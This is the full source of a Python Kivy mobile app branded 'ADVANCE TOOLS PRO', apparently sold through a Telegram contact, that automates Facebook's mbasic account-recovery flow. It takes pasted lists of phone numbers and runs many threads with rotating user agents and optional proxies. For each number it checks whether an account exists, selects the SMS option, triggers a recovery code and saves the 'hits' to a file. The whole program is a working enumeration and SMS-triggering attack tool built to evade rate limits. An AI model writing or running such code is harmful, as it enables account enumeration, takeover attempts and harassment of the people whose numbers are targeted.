import threading
import queue
import requests
import random
import re
import os
import time
from datetime import datetime
from urllib.parse import unquote

# --- KIVY & KIVYMD IMPORTS ---
from kivy.lang import Builder
from kivy.clock import Clock
from kivy.core.window import Window
from kivymd.app import MDApp
from kivymd.uix.screen import MDScreen
from kivymd.uix.list import TwoLineAvatarIconListItem, IconLeftWidget
from kivymd.uix.snackbar import Snackbar
from kivymd.uix.dialog import MDDialog
from kivymd.uix.button import MDFlatButton

try:
    from plyer import tts
except ImportError:
    tts = None

# --- UI LAYOUT (KV LANGUAGE) ---
KV = '''
MDBoxLayout:
    orientation: 'vertical'

    MDTopAppBar:
        title: "ADVANCE TOOLS PRO"
        left_action_items: [["robot", lambda x: None]]
        right_action_items: [["dots-vertical", lambda x: app.open_menu()]]
        elevation: 4

    MDBottomNavigation:
        selected_color_background: "orange"
        text_color_active: "lightgrey"

        # --- HOME TAB ---
        MDBottomNavigationItem:
            name: 'screen_home'
            text: 'Dashboard'
            icon: 'view-dashboard'

            MDBoxLayout:
                orientation: 'vertical'
                padding: dp(15)
                spacing: dp(15)

                # Stats Cards
                MDBoxLayout:
                    size_hint_y: None
                    height: dp(80)
                    spacing: dp(10)

                    MDCard:
                        style: "elevated"
                        padding: dp(10)
                        md_bg_color: 0.1, 0.7, 0.1, 0.2
                        orientation: "vertical"
                        MDLabel:
                            text: "SUCCESS"
                            halign: "center"
                            theme_text_color: "Custom"
                            text_color: 0, 1, 0, 1
                            font_style: "Caption"
                        MDLabel:
                            id: success_count
                            text: "0"
                            halign: "center"
                            font_style: "H5"
                            bold: True

                    MDCard:
                        style: "elevated"
                        padding: dp(10)
                        md_bg_color: 0.8, 0.1, 0.1, 0.2
                        orientation: "vertical"
                        MDLabel:
                            text: "FAILED"
                            halign: "center"
                            theme_text_color: "Custom"
                            text_color: 1, 0, 0, 1
                            font_style: "Caption"
                        MDLabel:
                            id: fail_count
                            text: "0"
                            halign: "center"
                            font_style: "H5"
                            bold: True

                MDTextField:
                    id: input_box
                    hint_text: "Paste Numbers Here (One per line)"
                    mode: "rectangle"
                    multiline: True
                    size_hint_y: 0.4
                    icon_right: "file-document-edit-outline"

                MDBoxLayout:
                    orientation: 'horizontal'
                    size_hint_y: None
                    height: dp(50)
                    spacing: dp(10)

                    MDRaisedButton:
                        id: start_btn
                        text: "START CRACKING"
                        size_hint_x: 0.5
                        md_bg_color: 0, 0.6, 0, 1
                        on_release: app.start_process()

                    MDRaisedButton:
                        id: stop_btn
                        text: "STOP"
                        size_hint_x: 0.5
                        md_bg_color: 0.8, 0, 0, 1
                        disabled: True
                        on_release: app.stop_process()

                MDLabel:
                    text: "Live Logs:"
                    font_style: "Subtitle2"
                    size_hint_y: None
                    height: dp(20)

                ScrollView:
                    MDLabel:
                        id: log_label
                        text: "Waiting to start..."
                        size_hint_y: None
                        height: self.texture_size[1]
                        font_style: "Caption"
                        theme_text_color: "Secondary"

        # --- SUCCESS TAB ---
        MDBottomNavigationItem:
            name: 'screen_success'
            text: 'Success'
            icon: 'check-decagram'
            badge_icon: "numeric-0"
            id: success_badge

            MDBoxLayout:
                orientation: 'vertical'
                MDLabel:
                    text: "Successful Hits"
                    halign: "center"
                    size_hint_y: None
                    height: dp(40)
                    font_style: "H6"
                
                ScrollView:
                    MDList:
                        id: success_list

        # --- SETTINGS TAB ---
        MDBottomNavigationItem:
            name: 'screen_settings'
            text: 'Settings'
            icon: 'cog'

            ScrollView:
                MDBoxLayout:
                    orientation: 'vertical'
                    padding: dp(20)
                    spacing: dp(20)
                    size_hint_y: None
                    height: self.minimum_height

                    MDCard:
                        orientation: "vertical"
                        padding: dp(15)
                        size_hint_y: None
                        height: dp(120)
                        radius: [10]
                        
                        MDLabel:
                            text: "KEY INFORMATION"
                            theme_text_color: "Primary"
                            bold: True
                        MDLabel:
                            text: "Status: ACTIVE (Premium)"
                            theme_text_color: "Custom"
                            text_color: 0, 1, 0, 1
                            font_style: "Subtitle2"
                        MDLabel:
                            text: "Expires: Lifetime Access"
                            font_style: "Caption"
                        MDLabel:
                            text: "Device ID: " + app.device_id
                            font_style: "Caption"
                            theme_text_color: "Secondary"

                    MDTextField:
                        id: thread_input
                        hint_text: "Threads (Speed)"
                        text: "10"
                        helper_text: "Recommended: 10-30"
                        helper_text_mode: "persistent"
                        input_filter: "int"

                    MDBoxLayout:
                        orientation: "horizontal"
                        size_hint_y: None
                        height: dp(40)
                        MDLabel:
                            text: "Use Proxy"
                            halign: "left"
                        MDSwitch:
                            id: proxy_switch
                            active: False
                    
                    MDTextField:
                        id: proxy_path
                        hint_text: "Proxy File Path (.txt)"
                        disabled: not proxy_switch.active
                        icon_right: "folder-search-outline"

        # --- SUPPORT TAB ---
        MDBottomNavigationItem:
            name: 'screen_support'
            text: 'Support'
            icon: 'headset'

            MDBoxLayout:
                orientation: 'vertical'
                padding: dp(20)
                MDLabel:
                    text: "Developer Support"
                    halign: "center"
                    font_style: "H5"
                MDLabel:
                    text: "Telegram: @toolsadmin_A"
                    halign: "center"
                    theme_text_color: "Custom"
                    text_color: 0, 0.5, 1, 1
'''

# --- LOGIC & HELPERS ---
from bs4 import BeautifulSoup

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"
]

is_running = False
stats = {"success": 0, "fail": 0, "error": 0}

def get_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://mbasic.facebook.com/',
    }

def force_mbasic(url):
    if not url: return "https://mbasic.facebook.com/login/identify/"
    if "facebook.com" in url:
        url = url.replace("www.facebook.com", "mbasic.facebook.com")
        url = url.replace("m.facebook.com", "mbasic.facebook.com")
        url = url.replace("free.facebook.com", "mbasic.facebook.com")
        url = url.replace("d.facebook.com", "mbasic.facebook.com")
    return url

def format_action_url(action):
    if not action: return "https://mbasic.facebook.com/login/identify/"
    if action.startswith("http"): return force_mbasic(action)
    return "https://mbasic.facebook.com" + action

def check_and_follow_redirect(session, content, headers):
    try:
        soup = BeautifulSoup(content, 'html.parser')
        redirect_url = None
        
        # 1. Meta Refresh
        meta_refresh = soup.find('meta', attrs={'http-equiv': re.compile(r'^refresh$', re.I)})
        if meta_refresh:
            content_attr = meta_refresh.get('content', '')
            match = re.search(r'url\s*=\s*([^;]+)', content_attr, re.I)
            if match:
                redirect_url = unquote(match.group(1).strip("'\""))

        # 2. JS Redirect
        if not redirect_url:
            for script in soup.find_all('script'):
                if script.string:
                    match = re.search(r'(?:window|document)\.location(?:\.href)?\s*=\s*["\']([^"\']+)["\']', script.string)
                    if match:
                        redirect_url = unquote(match.group(1).replace('\\/', '/'))
                        break

        # 3. Fallback Link
        if not redirect_url and len(content) < 3000:
            links = soup.find_all('a')
            if len(links) > 0 and len(links) <= 3:
                 href = links[0].get('href')
                 if href:
                     redirect_url = href

        if redirect_url:
            redirect_url = force_mbasic(redirect_url)
            return session.get(redirect_url, headers=headers, timeout=15)
    except: pass
    return None

def handle_cookie_consent(session, content, headers):
    soup = BeautifulSoup(content, 'html.parser')
    text_lower = soup.get_text().lower()
    if "allow" in text_lower or "accept" in text_lower or "cookie" in text_lower or "data policy" in text_lower:
        try:
            form = soup.find('form', {'method': 'post'})
            if form:
                action_url = format_action_url(form.get('action', ''))
                data = {}
                for inp in form.find_all('input'):
                    if inp.get('name'): data[inp.get('name')] = inp.get('value', '')
                session.post(action_url, headers=headers, data=data, timeout=10)
                return True
        except: pass
    return False

def check_success(soup, content_str):
    text_lower = content_str.lower()
    
    keywords = [
        "enter the 6-digit code", "we sent a code", "check your sms", 
        "enter security code", "sent to your", "digit code", 
        "we've sent your code", "enter the code", "your code is",
        "কোড লিখুন", "আপনার কোড"
    ]
    if any(k in text_lower for k in keywords): return True

    if soup.find('input', {'name': 'n'}): return True

    if '"event_step","event","extra_client_data_bks_input"' in content_str:
         if '"pre_mt_behavior","search_sent_client"' in content_str: return True
         if '"event","search_error_dialog_shown"' in content_str: return False

    return False

def execute_cracking(number, use_proxy, proxy_list):
    try:
        session = requests.Session()
        headers = get_random_headers()
        
        if use_proxy and proxy_list:
            try:
                prx = random.choice(proxy_list)
                session.proxies = {"http": prx, "https": prx}
            except: return 'error'

        url = "https://mbasic.facebook.com/login/identify/"
        req1 = None
        form = None
        
        # 1. INITIAL REQUEST LOOP
        for attempt in range(4): 
            try:
                if not req1:
                    req1 = session.get(url, headers=headers, timeout=15)
                
                redir = check_and_follow_redirect(session, req1.content, headers)
                if redir: 
                    req1 = redir
                    continue

                if handle_cookie_consent(session, req1.content, headers):
                    req1 = session.get(url, headers=headers, timeout=15)

                soup = BeautifulSoup(req1.content, 'html.parser')
                text_lower = soup.get_text().lower()
                
                if "error facebook" in soup.title.get_text().lower() if soup.title else "" or "something went wrong" in text_lower:
                    if attempt < 3: time.sleep(2); continue
                    else: return 'blocked'
                
                # Auto Redirect for Login Page (recover link)
                if soup.find('input', {'name': 'pass'}):
                    recover_link = soup.find('a', href=re.compile(r'(recover|identify)'))
                    if recover_link:
                        href = format_action_url(recover_link['href'])
                        req1 = session.get(href, headers=headers, timeout=15)
                        continue 

                target_input = soup.find('input', {'name': 'email'})
                if target_input: form = target_input.find_parent('form')
                if not form:
                    for f in soup.find_all('form'):
                        if 'identify' in f.get('action', '') or 'search' in f.get('action', ''): form = f; break
                if not form:
                    for f in soup.find_all('form'):
                        if f.get('method', '').lower() == 'post' and f.find('input'): form = f; break
                if form: break 
            except: time.sleep(1)
        
        if not form: 
            if req1 and check_success(BeautifulSoup(req1.content, 'html.parser'), req1.text):
                return 'success'
            return 'not_found'

        action_url = format_action_url(form.get('action', ''))
        data = {}
        for inp in form.find_all('input'):
            if inp.get('name'): data[inp.get('name')] = inp.get('value', '')
        data['email'] = number
        
        req_next = None
        try:
            req_next = session.post(action_url, headers=headers, data=data, timeout=15)
        except: return 'net_error'

        for step in range(1, 5):
            redir = check_and_follow_redirect(session, req_next.content, headers)
            if redir: req_next = redir

            content_str = req_next.text
            soup = BeautifulSoup(req_next.content, 'html.parser')
            text_lower = soup.get_text().lower()

            if check_success(soup, content_str):
                return 'success'

            if "did not match" in text_lower or "no search results" in text_lower: return 'not_found'
            if "captcha" in text_lower or "security check" in text_lower: return 'captcha'
            if "something went wrong" in text_lower: return 'blocked'

            try_another_way = soup.find('a', href=lambda x: x and '/recover/initiate/' in x)
            if try_another_way:
                 link = format_action_url(try_another_way['href'])
                 try:
                     req_next = session.get(link, headers=headers, timeout=15)
                     continue 
                 except: return 'net_error'

            form = soup.find('form', {'method': 'post'})
            if not form:
                if check_success(soup, content_str):
                     return 'success'
                
                continue_link = soup.find('a', string=re.compile(r'Continue|Next|অব্যাহত', re.I))
                if continue_link:
                    href = format_action_url(continue_link['href'])
                    req_next = session.get(href, headers=headers, timeout=15)
                    continue
                break

            action_url = format_action_url(form.get('action', ''))
            data = {}
            for inp in form.find_all('input'):
                if inp.get('name'): data[inp.get('name')] = inp.get('value', '')

            radios = form.find_all('input', {'type': 'radio'})
            sms_radio_found = False
            
            if radios:
                for radio in radios:
                    val = radio.get('value', '').lower()
                    label_text = ""
                    if radio.get('id'):
                        l = soup.find('label', {'for': radio.get('id')})
                        if l: label_text = l.get_text().lower()
                    
                    if "sms" in val or "sms" in label_text:
                        data[radio.get('name')] = radio.get('value')
                        sms_radio_found = True
                        break
                
                if not sms_radio_found:
                    data[radios[0].get('name')] = radios[0].get('value')

            submit_btn = form.find('input', {'type': 'submit'})
            if not submit_btn: submit_btn = form.find('button', {'type': 'submit'})
            if submit_btn and submit_btn.get('name'):
                data[submit_btn.get('name')] = submit_btn.get('value', '')

            try:
                time.sleep(1) 
                req_next = session.post(action_url, headers=headers, data=data, timeout=15)
            except: return 'net_error'

        return 'not_found'
    except: return 'error'

def worker(numbers_q, app_instance, use_proxy, proxy_list):
    global is_running
    while is_running and not numbers_q.empty():
        try:
            number = numbers_q.get()
            app_instance.update_log(f"Checking: {number}...")
            
            # CALL REAL LOGIC
            result = execute_cracking(number, use_proxy, proxy_list)
            
            if result == 'success':
                stats['success'] += 1
                app_instance.add_success(number)
                app_instance.update_log(f"[SUCCESS] Code sent to {number}")
            elif result == 'not_found':
                stats['fail'] += 1
                app_instance.update_log(f"[FAIL] No account {number}")
            elif result == 'captcha':
                app_instance.update_log(f"[CAPTCHA] {number}")
            elif result == 'blocked':
                stats['error'] += 1
                app_instance.update_log(f"[BLOCKED] IP Blocked")
            elif result == 'net_error':
                stats['error'] += 1
                app_instance.update_log(f"[NET ERR] Network Issue")
            else:
                stats['error'] += 1
                app_instance.update_log(f"[ERROR] Unknown Error")

            app_instance.update_stats_ui()

        except Exception as e:
            app_instance.update_log(f"Thread Error: {str(e)}")
        finally:
            numbers_q.task_done()
    
    # Check if all done
    if numbers_q.empty() and is_running:
         app_instance.stop_process(finished=True)

# --- MAIN APP CLASS ---
class AdvanceToolsApp(MDApp):
    device_id = "UNKNOWN"

    def build(self):
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "Green"
        self.theme_cls.accent_palette = "Orange"
        return Builder.load_string(KV)

    def on_start(self):
        # Generate HWID
        import uuid
        self.device_id = str(uuid.getnode())[:12]
        
        # Welcome Voice
        try:
            if tts:
                tts.speak("Welcome to Advance Mobile Tools Pro")
        except: pass
        
        self.update_log("System Ready. Please load numbers.")

    def update_log(self, msg):
        Clock.schedule_once(lambda dt: self._log_internal(msg))

    def _log_internal(self, msg):
        current = self.root.ids.log_label.text
        # Keep log short to prevent lag
        if len(current) > 2000: current = current[:1000]
        self.root.ids.log_label.text = f"{msg}\n{current}"

    def add_success(self, number):
        Clock.schedule_once(lambda dt: self._add_success_internal(number))

    def _add_success_internal(self, number):
        # Add to List
        item = TwoLineAvatarIconListItem(
            text=f"{number}",
            secondary_text=f"Hit Time: {datetime.now().strftime('%H:%M:%S')}"
        )
        icon = IconLeftWidget(icon="check-circle", theme_text_color="Custom", text_color=(0,1,0,1))
        item.add_widget(icon)
        self.root.ids.success_list.add_widget(item)
        
        # Save to File
        try:
            with open("success_hits.txt", "a") as f:
                f.write(f"{number}\n")
        except: pass

    def update_stats_ui(self):
        Clock.schedule_once(lambda dt: self._update_stats_real())

    def _update_stats_real(self):
        self.root.ids.success_count.text = str(stats['success'])
        self.root.ids.fail_count.text = str(stats['fail'])
        # Update badge
        self.root.ids.success_badge.badge_icon = f"numeric-{stats['success']}" if stats['success'] < 10 else "9-plus"

    def start_process(self):
        global is_running, stats
        text_data = self.root.ids.input_box.text
        if not text_data.strip():
            Snackbar(text="Please enter numbers first!", bg_color=(1, 0, 0, 1)).open()
            return

        # UI Update
        self.root.ids.start_btn.disabled = True
        self.root.ids.stop_btn.disabled = False
        self.root.ids.input_box.disabled = True
        self.update_log("Initializing engine...")

        # Reset
        stats = {"success": 0, "fail": 0, "error": 0}
        self.root.ids.success_list.clear_widgets()
        self.update_stats_ui()

        # Prepare Queue
        q = queue.Queue()
        lines = text_data.split('\n')
        for line in lines:
            if line.strip(): q.put(line.strip())

        # Configs
        try: threads_count = int(self.root.ids.thread_input.text)
        except: threads_count = 10
        
        use_proxy = self.root.ids.proxy_switch.active
        proxy_path = self.root.ids.proxy_path.text
        proxies = []
        if use_proxy and os.path.exists(proxy_path):
            with open(proxy_path, 'r') as f:
                proxies = [l.strip() for l in f if l.strip()]

        is_running = True
        
        # Start Threads
        for i in range(threads_count):
            t = threading.Thread(target=worker, args=(q, self, use_proxy, proxies))
            t.daemon = True
            t.start()
            
        self.update_log(f"Started {threads_count} threads.")

    def stop_process(self, finished=False):
        global is_running
        is_running = False
        
        Clock.schedule_once(lambda dt: self._stop_ui_reset(finished))

    def _stop_ui_reset(self, finished):
        self.root.ids.start_btn.disabled = False
        self.root.ids.stop_btn.disabled = True
        self.root.ids.input_box.disabled = False
        
        msg = "Task Finished!" if finished else "Stopped by User."
        self.update_log(msg)
        Snackbar(text=msg, bg_color=(0, 0.5, 1, 1)).open()

    def open_menu(self):
        # Placeholder for top menu
        pass

if __name__ == '__main__':
    AdvanceToolsApp().run()
